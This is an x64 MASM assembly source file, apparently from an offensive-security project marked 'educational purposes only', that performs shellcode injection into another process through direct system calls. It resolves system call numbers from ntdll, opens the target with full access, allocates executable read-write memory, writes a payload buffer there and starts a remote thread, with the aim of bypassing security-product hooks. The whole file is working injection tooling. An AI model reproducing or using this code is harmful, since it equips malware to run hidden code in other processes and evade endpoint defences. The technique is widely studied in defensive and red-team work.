; /*
;
; > Direct Systemcalls with MASM64 Assembly <
;
; @author: 0xCyberGenji
; @website:0xCyberGenji.github.io
; @warning: This project has been developed for educational purposes only. Its use in real scenarios is at one's own risk. 
;
; */

include box.inc
include syscalls.inc

.data
    ntDLL                       dw 'n','t','d','l','l','.','d','l','l',0
.code 

mainCRTStartup PROC 
    push rbp
    mov rbp,rsp
    sub rsp,80h  
    xor rax,rax
    mov [rbp + 80h],rax
       
    ;* CLIENT_ID           CID         = { (HANDLE)PID, NULL };
    ; Target Process ID is here 
    mov CID.UniqueProcess,0    
    ; Default 0 
    mov CID.UniqueThread,0 

    ;* OBJECT_ATTRIBUTES   objAttr     = { sizeof(objAttr), NULL };    
    mov objAttr.oLength,0    
    mov objAttr.RootDirectory,0    
    mov objAttr.ObjectName,0    
    mov objAttr.Attributes,0    
    mov objAttr.SecurityDescriptor,0    
    mov objAttr.SecurityQualityOfService,0    
    mov objAttr.oLength,sizeof OBJECT_ATTRIBUTES 

    ;* HMODULE GetModuleHandleW(
    ;*      [in, optional] LPCWSTR lpModuleName
    ;* ); 
    lea rax, ntDLL
    mov rcx, rax
    call GetModuleHandleW
    mov [rbp+80h], rax

    lea rdi,ntOpenStr
    lea rsi,AddrOfNtOpenProcess
    mov rsi,rdi
    xor rbx,rbx 
    call GetSSN

    ;* typedef NTSTATUS(NTAPI* fn_NtOpenProcess) (
    ;*      OUT PHANDLE ProcessHandle,
    ;*      IN ACCESS_MASK DesiredAccess,
    ;*      IN POBJECT_ATTRIBUTES ObjectAttributes,
    ;*      IN PCLIENT_ID ClientId OPTIONAL
    ;* );
    lea r8,objAttr                  ; ObjectAttributes
    lea r9,CID                      ; CLientId
    mov edx,1FFFFFh                 ; DesiredAccess
    lea rcx,hProcess                ; ProcessHandle
    call NtOpenProcess 

    cmp rax,0
    jnz CLEANUP

    lea rsi,ntVirtualStr
    lea rdx,AddrOfNtAllocateVirtualMemory
    mov rax,[rbp+80h]
    xor rbx,rbx 
    call GetSSN

    ;* typedef NTSTATUS(NTAPI* fn_NtAllocateVirtualMemory) (
    ;*      IN HANDLE ProcessHandle,
    ;*      IN OUT PVOID* BaseAddress,
    ;*      IN ULONG ZeroBits,
    ;*      IN OUT PSIZE_T RegionSize,
    ;*      IN ULONG AllocationType,
    ;*      IN ULONG Protect
    ;* );
    mov rcx,sizeof payload
    mov payloadSize,rcx
    lea rsi,payloadSize
    xor rcx,rcx
    mov dword ptr [rsp + 28h],40h   ; Protect
    mov dword ptr [rsp + 20h],3000h ; AllocationType
    mov r9,rsi                      ; RegionSize
    mov r8d,0                       ; ZeroBits
    lea rdx,rBuffer                 ; BaseAddress
    mov rcx,hProcess                ; ProcessHandle    
    call NtAllocateVirtualMemory 

    cmp rax,0
    jnz CLEANUP

    lea rsi,ntWriteStr
    lea rdx,AddrOfNtWriteVirtualMemory
    mov rax,[rbp+80h]
    xor rbx,rbx 
    call GetSSN

    ;* typedef NTSTATUS(NTAPI* fn_NtWriteVirtualMemory) (
    ;*      IN HANDLE ProcessHandle,
    ;*      IN PVOID BaseAddress,
    ;*      IN PVOID Buffer,
    ;*      IN SIZE_T NumberOfBytesToWrite,
    ;*      OUT PSIZE_T NumberOfBytesWritten OPTIONAL
    ;* );
    mov qword ptr [rsp + 20h],0     ; NumberOfBytesWritten
    mov r9,sizeof payload       ; NumberOfBytesToWrite
    lea rcx,payload                 
    mov r8,rcx                      ; Buffer
    mov rdx,rBuffer                 ; BaseAddress
    mov rcx,hProcess                ; ProcessHandle
    call NtWriteVirtualMemory  

    cmp rax,0
    jnz CLEANUP

    lea rsi,ntCreateStr
    lea rdx,AddrOfNtCreateThreadEx
    mov rax,[rbp+80h]
    xor rbx,rbx 
    call GetSSN

    ;* typedef NTSTATUS(NTAPI* fn_NtCreateThreadEx) (
    ;*      OUT PHANDLE ThreadHandle,
    ;*      IN ACCESS_MASK DesiredAccess,
    ;*      IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    ;*      IN HANDLE ProcessHandle,
    ;*      IN PVOID StartRoutine,
    ;*      IN PVOID Argument OPTIONAL,
    ;*      IN ULONG CreateFlags,
    ;*      IN SIZE_T ZeroBits,
    ;*      IN SIZE_T StackSize,
    ;*      IN SIZE_T MaximumStackSize,
    ;*      IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL
    ;* );
    mov rdx,rBuffer 
    mov r8,hProcess  
    lea rcx,objAttr    
    mov qword ptr [rsp + 50h],0     ; AttributeList
    mov qword ptr [rsp + 48h],0     ; MaximumStackSize
    mov qword ptr [rsp + 40h],0     ; StackSize
    mov qword ptr [rsp + 38h],0     ; ZeroBits
    mov dword ptr [rsp + 30h],0     ; CreateFlags
    mov qword ptr [rsp + 28h],0     ; Argument       
    mov qword ptr [rsp + 20h],rdx   ; StartRoutine
    mov r9,r8                       ; ProcessHandle
    lea r8,objAttr                  ; ObjectAttributes
    mov edx,1FFFFFh                 ; DesiredAccess
    lea rcx,hThread                 ; ThreadHandle
    call NtCreateThreadEx 

    cmp rax,0
    jnz CLEANUP

    ;* DWORD WaitForSingleObject(
    ;*      [in] HANDLE hHandle,
    ;*      [in] DWORD  dwMilliseconds
    ;* );
    mov edx,0FFFFFFFFh
    mov rcx,hThread
    call WaitForSingleObject

    jmp CLEANUP
mainCRTStartup ENDP

END